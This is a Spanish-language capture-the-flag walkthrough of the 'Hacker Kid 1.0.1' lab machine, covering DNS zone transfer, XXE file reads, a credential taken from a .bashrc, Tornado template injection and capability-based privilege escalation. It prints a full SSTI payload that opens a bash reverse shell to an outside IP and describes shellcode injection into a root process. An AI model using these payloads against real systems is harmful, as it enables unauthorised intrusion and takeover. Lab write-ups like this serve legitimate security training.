# Hacker Kid 1.0.1

Tags: [[_webFuzzing]],[[_xxe]],[[_ssti]],[[_webExploitation]],[[_capabilities]]

## Primeros pasos
(Reconocimiento).

Primero le acomodamos bien para que agarre una IP (poner modo Bridged).

Organizamos TMUX.
Hacemos un escaneo en la red para determinar la IP de la máquina.
Mediante el OUI reconocemos la máquina que vamos a atacar.

Le hacemos un ping a la máquina. (Está activa o no).
Posible máquina Linux.
Creamos un directorio como la IP o nombre de la máquina.
Ponemos la IP de la máquina en un lugar visible.
Creamos los directorios de trabajo.

Empezamos el escaneo con NMAP.

Buscamos codename con launchpad, un posible Ubuntu Focal.

Puertos abiertos.

<span style="color:#ff669c">53</span> - domain
bind.version: 9.16.1-Ubuntu

<span style="color:#ff669c">80</span> - HTTP

<span style="color:#ff669c">9999</span> - abyss. HTTPD
Pide loguearse.


## Investigación (Intrusión)
(Reconocimiento/Enumeración).

<span style="color:#ff669c">53</span>.
ISC Bind permite conectar fácilmente registros de ISC Bind con Microsoft Sentinel.
Tiene algo que ver con el DNS.
Para descubrir dominios asociados (así como IPs expuestas, etc.) necesito tener el dominio de la web antes. Después usamos dig

dig.
Conseguimos estos dominios
blackhat.local
hackers.blackhat.local

Antes de esto, vemos qué cambian en las webs.
Ahora probemos a hacer el ataque de transferencia de zona:
Como el segundo ya tiene "hackers", hacemos reconocimiento al segundo.

Descubrimos
-Una IP, nada importante.
-Correos sin importancia

Un server encontrado.
hackerkid.blackhat.local :    es el más interesante.
Por el puerto 80 si cambia, en 9999 no.


<span style="color:#ff669c">80</span>.
whatweb.
Lo típico, jquery, el título, no mucho.

Análisis de la web.
En el código fuente dice que hay un parámetro GET "page_no" para ver páginas. Lo probamos

Y nos pone un texto, así que debemos fuzzear para encontrar algo de información.
Hicimos un script para automatizarlo:
![[Pasted image 20240723114216.png]]
Lo <span style="color:#07b4f2">ejecuté</span> así: <span style="color:#88c425">./fuzz.sh | grep -oP "\d{1,3}"</span>

Y veo que el número 21 me muestra algo, 
Bla bla, y me da esto hackers.blackhat.local
(Ahora usemos esos al entrar a las webs y todo eso).

Dice que tiene subdominios configurados, así que por eso el puerto 53, como ya habíamos visto podemos aplicar un <span style="color:#ff2dc0">Domain Zone Transfer Attack</span>, con <span style="color:#ff2dc0">dig</span>.

Antes de lo de arriba verificamos las webs
blackhat.local :    Forbidden, pero normal en 9999.
hackers.blackhat.local :    es todo normal.


<span style="color:#bef202">Subdominio</span>.
<span style="color:#ecacb6">hackerkid.blackhat.local</span>
En el código fuente se ve que se envía data en formato XML.
Al final llama al archivo "process.php", lo busco en la URL, pero me dice escrito que no está habilitado.

Al enviar el formulario me dice que el correo no está habilitado, etc., lo mejor es que intercepte con BurpSuite.

Test XXE.
Es vulnerable a un XXE, puedo cargar archivos locales, un tipo "LFI", pero XXE tiene cosillas, antes de avanzarlo, es preferible enumerar la máquina bien. Recordemos usar base64 si no se ve.
XXE -> "LFI"
Usuario "saket" a nivel de sistema. No puedo validarlo.
Puertos internos: 53, 631, 953, 9999

Se tensó un poco más, puedo hacer peticiones a mi servidor desde el XXE.
Puedo intentar inyectar un DTD malicioso. 
PROBAR. Apuntar al dominio que me pone forbbiden en el puerto 80 (blackhat.local). Pero antes enumeremos más.

En el <span style="color:#ecacb6">/home/saket/.bashrc</span> :    vemos una credencial para la app de python.
<span style="color:#ff9a57">admin</span>:<span style="color:#ff9a57">Saket!#$%@!!</span> || <span style="color:#ff9a57">saket</span>:<span style="color:#ff9a57">Saket!#$%@!!</span>
Pero no son del panel de login (Tornado).
Lo que hice fue probar "<span style="color:#ff9a57">saket</span>" como username y me deja entrar.


<span style="color:#ff669c">9999.</span>
Tornado httpd 6.1 Framework de python, diseñado, crear servidores web en modo no bloqueo, permite continuidad de procesos des pués de que la transmisión de datos haya concluido. Esto con python.

whatweb.
Primero entra a una ruta y aplica un redirect a un Title "Please Log In".

Análisis de la web.
Es un login, pide username y password.
Algo de que el home no se qué, le doy a un enlace y me lleva al de nuevo, pero me cuenta las veces que le di.

Gracias al XXE obtuve una credencial y entro.
Es Tornado, podemos buscar extensiones .py

Antes de eso, la web me dice que le de mi nombre o unas movidas, intercepto con BurpSuite y veo que se envían cositas.

Antes de eso, podemos buscar en Searchsploit e Internet para encontrar alguna vulnerabilidad para<span style="color:#ff2dc0"> Tornado http 6.1</span>

Ojo.
https://www.invicti.com/web-vulnerability-scanner/vulnerabilities/out-of-band-code-execution-via-ssti-python-tornado/

https://www.invicti.com/web-vulnerability-scanner/vulnerabilities/code-execution-via-ssti-python-tornado/

Esas dos son informativas.

https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection

En esta vemos que par el ejemplo hay un parámetro <span style="color:#ecacb6">?name</span>, pruebo en donde estoy logueado y sí, me muestra mi input.
https://ajinabraham.com/blog/server-side-template-injection-in-tornado :    (hasta puedo copiar código y practicar).
De hecho, parece ser el mismo código.

En Tornado en el puerto 9999
STTI -> RCE
<span style="color:#ecacb6">http://hackers.blackhat.local:9999/?name={%%20import%20os%20%}{{os.system(%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.0.13/443%200%3E%261%22%27)}}</span>
Ese fue el payload que usé.
https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection :    al final lo vi de aquí también.

Ejecuto (Reverse Shell) y pa deeentro.


## Escalada

Enumerar todo el sistema.
Efectivamente, Ubuntu Focal.
sudo -l :    no tengo la credencial del usuario.

Hay una capabilitie para el python2.7 (CAP_SYS_PTRACE) :    Investigar.

HackTricks me dice que tengo que proporcionar in PID.
Así que analicemos los procesos.
Efectivamente, tiene que ver con procesos, en este caso, lo primero es ver un proceso que esté corriendo root, uno de apache por ejemplo, y obtener el PID (<span style="color:#88c425">ps -eaf</span>).

Luego copiamos el script de https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#capabilities-in-docker-containers :    el de python2.7 de la capabilitie en cuestión.
Este PoC ayudó: https://tbhaxor.com/exploiting-linux-capabilities-part-6/

Lo creamos en la máquina víctima, ponemos bien el HashBang y eso.

Después lo ejecutamos
<span style="color:#88c425">python2.7 prueba.py 751</span> :    le pasamos el PID del proceso de root.
Eso lo que hace es inyectar <span style="color:#ff2dc0">Shellcode</span> para que se ejecute , y como el servicio lo corre <span style="color:#ff2dc0">root</span>, se hará de forma <span style="color:#ff2dc0">privilegiada</span>, con el fin de que entable una [[Bind Shell]] por TCP, por un puerto y poder conectarme después.

Nos abre por defecto el <span style="color:#ff669c">puerto 5600</span>, así que solo basta conectarse <span style="color:#88c425">nc localhost 5600</span> :    esto desde la máquina víctima, pero puedo entrar desde mi máquina poniendo la IP de la máquina víctima (por ello la idea de salir de un contenedor).

Y pa deeeeentro.
FIN.

Tuvo de todo, XXE, STTI, "LFI", Capabilitie Abusing.